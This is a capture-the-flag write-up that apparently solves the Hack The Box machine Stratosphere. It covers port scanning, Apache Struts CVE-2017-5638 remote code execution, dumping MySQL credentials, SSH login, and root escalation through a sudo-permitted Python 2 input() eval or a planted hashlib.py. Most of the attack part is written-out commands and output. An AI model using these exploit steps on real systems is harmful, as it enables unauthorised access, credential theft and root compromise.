# Stratosphere

## Enumeration

Let's us begin with the basic scanning with `masscan`

```
root@kali:~/Desktop/HTB/Stratosphere# masscan -e tun0 -p1-65535 10.10.10.64 --rate=2000

Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2018-09-01 14:08:03 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 80/tcp on 10.10.10.64                                     
Discovered open port 22/tcp on 10.10.10.64                                     
Discovered open port 8080/tcp on 10.10.10.64  
```

and follow it up with nmap

```
nmap -sC -sV -p $(cat first-scan | cut -d " " -f4 | cut -d "/" -f1 | paste -sd ",") -A 10.10.10.64

22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)
|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)
|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (EdDSA)
80/tcp   open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Sat, 01 Sep 2018 14:11:43 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Sat, 01 Sep 2018 14:11:40 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Transfer-Encoding: chunked
|     Date: Sat, 01 Sep 2018 14:11:41 GMT
|     Connection: close
|   X11Probe: 
|     HTTP/1.1 400 
|     Transfer-Encoding: chunked
|     Date: Sat, 01 Sep 2018 14:11:43 GMT
|_    Connection: close
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Stratosphere
8080/tcp open  http-proxy

```

The results show that there are `HTTP` services running, 

Next we should run some directory listing while we enumerate the website manually and see if we can find anything interesting. Starting with port `8080` because is more uncommon compare to `80`

### Gobuster

> To run in background while we search for other stuff

```
root@kali:~/Desktop/HTB/Stratosphere# gobuster -u http://10.10.10.64 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.64/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/manager (Status: 302)
/Monitoring (Status: 302)

root@kali:~/Desktop/HTB/Stratosphere# gobuster -u http://10.10.10.64:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.64:8080/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/manager (Status: 302)
/Monitoring (Status: 302)

```

Visiting port `8080` only result in some standard html pages

![1535811556415](https://raw.githubusercontent.com/lycjackie/boot2root/master/images/stratosphere/8080.png)

and viewing source did not yield any interesting results.



### Exploring /manager

![1535811619980]((https://raw.githubusercontent.com/lycjackie/boot2root/master/images/stratosphere/tomcat.png)

when we visit `/manager` we can see that is a tomcat services. Which most likely means that `java` is installed on the server.

After trying several default password for `tomcat manager`, we can see that this maybe a rabbit hole.

### Exploring /Monitoring

Visiting the `/Monitoring` will redirect you to `http://10.10.10.64/Monitoring/example/Welcome.action`

Next we try some random 404 pages and we get the following image.

![1535811802070]((https://raw.githubusercontent.com/lycjackie/boot2root/master/images/stratosphere/404.png)

While exploring the pages manually, notices that all pages will end with `.action`. This give us some lead on what to search for.  Which gave us the result for `Apache Struts CVE-2017-5638 https://github.com/mazen160/struts-pwn`

## Getting Users

With the `--check` function provided by the script, we can quickly see that the server is vulnerable.

```bash
root@kali:~/Desktop/HTB/Stratosphere# python struts-pwn.py --check --url 'http://10.10.10.64:8080/Monitoring/example/Welcome.action'

[*] URL: http://10.10.10.64:8080/Monitoring/example/Welcome.action
[*] Status: Vulnerable!
[%] Done.

```



Which allow us to have some `RCE`

```
root@kali:~/Desktop/HTB/Stratosphere# python struts-pwn.py --url 'http://10.10.10.64:8080/Monitoring/example/Welcome.action' -c 'id'

[*] URL: http://10.10.10.64:8080/Monitoring/example/Welcome.action
[*] CMD: id
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
Note: Server Connection Closed Prematurely

uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)

[%] Done.

```

Next we can check the process that is running with `ps aux` 

```
tomcat8   3062  0.0  0.1  30432  2596 ?        S    09:07   0:00 mysql -u admin -p admin
tomcat8   3072  0.0  0.1  30432  2668 ?        S    09:08   0:00 mysql -u admin -p admin
tomcat8   3073  0.0  0.1  30432  2576 ?        S    09:08   0:00 mysql -u admin -p admin
tomcat8   3075  0.0  0.1  30432  2624 ?        S    09:09   0:00 mysql -u admin -p admin
tomcat8   3110  0.0  0.3  26928  8176 ?        S    09:15   0:00 python -v
tomcat8   3111  0.0  0.1  30432  2656 ?        S    09:15   0:00 mysql -u ssn_admin -p AWs64@on*& -D ssn
tomcat8   3502  0.0  0.4  26928  8280 ?        S    09:38   0:00 python3
tomcat8   3505  0.0  0.1  19624  3212 ?        S    09:38   0:00 bash
tomcat8   3508  0.0  0.1  19624  3236 ?        S    09:38   0:00 /bin/bash
```

> Note that the mysql password for admin is available. Which means we can use mysql to do some db enumeration

### Database Enumeration

```
python struts-pwn.py --url 'http://10.10.10.64:8080/Monitoring/example/Welcome.action' -c 'mysql -u admin -padmin -e "show databases"'

Database
information_schema
users

root@kali:~/Desktop/HTB/Stratosphere# python struts-pwn.py --url 'http://10.10.10.64:8080/Monitoring/example/Welcome.action' -c 'mysql -u admin -padmin -D users -e "show tables"'

Tables_in_users
accounts

root@kali:~/Desktop/HTB/Stratosphere# python struts-pwn.py --url 'http://10.10.10.64:8080/Monitoring/example/Welcome.action' -c 'mysql -u admin -padmin -D users -e "select * from accounts"'

fullName	password	username
Richard F. Smith	9tc*rhKuG5TyXvUJOrE^5CK7k	richard

```



With access to these `credential` so what else can we do? We will need more information about the system.

So let's get the `/etc/passwd` to see which user account is there

```
root:x:0:0:root:/root:/bin/bash
richard:x:1000:1000:Richard F Smith,,,:/home/richard:/bin/bash
tomcat8:x:115:119::/var/lib/tomcat8:/bin/bash
```

> Note that we should only care about user with /bin/bash as they are valid accounts to be able to SSH in

We see that `richard` have an user account on the system. Coincidence? I think not. 

Let's try the credentials we got from `mysql` on the `ssh` services. Remember port `22` is open.

```
root@kali:~/Desktop/HTB/Stratosphere# ssh richard@10.10.10.64 
richard@10.10.10.64's password: 
Linux stratosphere 4.9.0-6-amd64 #1 SMP Debian 4.9.82-1+deb9u2 (2018-02-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Sep  1 10:33:19 2018 from 10.10.14.124
richard@stratosphere:~$ 

```

and we have a valid user. Wooohooooo

### User.txt

```
richard@stratosphere:~$ wc -c user.txt
33 user.txt
```

## Getting Root

Since we have credentials for a valid user. Why not start with `sudo -l` 

```
richard@stratosphere:~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py

```

>WOW running as root without passwd

### test.py

```
richard@stratosphere:~$ ls -la test.py
-rwxr-x--- 1 root richard 1507 Mar 19 15:23 test.py

```

> Note that we have no write access to test.py

Let's us take a look at the script.

```python
richard@stratosphere:~$ cat test.py
#!/usr/bin/python3
import hashlib


def question():
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
    md5 = hashlib.md5()
    md5.update(q1.encode())
    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":
        print("Sorry, that's not right")
        return
    print("You got it!")
    q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")
    sha1 = hashlib.sha1()
    sha1.update(q2.encode())
    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':
        print("Nope, that one didn't work...")
        return
    print("WOW, you're really good at this!")
    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")
    md4 = hashlib.new('md4')
    md4.update(q3.encode())
    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':
        print("Yeah, I don't think that's right.")
        return
    print("OK, OK! I get it. You know how to crack hashes...")
    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")
    blake = hashlib.new('BLAKE2b512')
    blake.update(q4.encode())
    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':
        print("You were so close! urg... sorry rules are rules.")
        return

    import os
    os.system('/root/success.py')
    return

question()

```

> Note the user input is read by input() instead of raw_input()

Remember our `sudo -l` result. We can run any `python*` command with root and we know that `python2 input` allow you to run any command as `eval`. So let's us check if `python2` exist in the machine

```bash
richard@stratosphere:~$ ls -la /usr/bin/python*
lrwxrwxrwx 1 root root      16 Feb 11  2018 /usr/bin/python -> /usr/bin/python3
lrwxrwxrwx 1 root root       9 Jan 24  2017 /usr/bin/python2 -> python2.7
-rwxr-xr-x 1 root root 3779512 Nov 24  2017 /usr/bin/python2.7
lrwxrwxrwx 1 root root       9 Jan 20  2017 /usr/bin/python3 -> python3.5
-rwxr-xr-x 2 root root 4747120 Jan 19  2017 /usr/bin/python3.5
-rwxr-xr-x 2 root root 4747120 Jan 19  2017 /usr/bin/python3.5m
lrwxrwxrwx 1 root root      10 Jan 20  2017 /usr/bin/python3m -> python3.5m

```

**JACKPOT**

We can know get root easily with the following command

```
richard@stratosphere:~$ sudo /usr/bin/python2 /home/richard/test.py
__import__("os").system("/bin/bash") 
root@stratosphere:/home/richard# 

```

### root.txt

```
root@stratosphere:~# wc -c root.txt
33 root.txt
```



### Alternative

Note that `test.py` import `hashlib`, which means that we can create `hashlib.py` on the same directory as the `test.py` and test.py will run our own `hashlib.py`

```
richard@stratosphere:~$ cat hashlib.py
import os
os.system('cat /root/root.txt')

richard@stratosphere:~$ sudo /usr/bin/python2 /home/richard/test.py
> root.txt : d41d8cd98f00b204e9800998ecf8427e
Solve: 5af003e100c80923ec04d65933d382cb

```

But as we all know. Having a shell is more fun. But we can literally write anything in `hashlib.py`.



# FIN
